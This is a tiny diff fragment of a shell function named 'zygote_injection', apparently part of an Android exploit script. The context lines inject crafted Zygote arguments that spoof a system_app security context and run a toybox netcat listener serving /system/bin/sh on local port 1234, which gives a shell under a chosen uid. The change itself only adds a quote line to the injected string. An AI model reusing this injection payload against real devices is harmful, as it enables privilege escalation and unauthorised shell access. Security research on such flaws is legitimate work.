@@ -117,6 +117,7 @@ zygote_injection() {
 --seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete
 --invoke-with
 toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;
+"
 "\n' "$uid" "$uid" "$NC_PORT"
 }
 
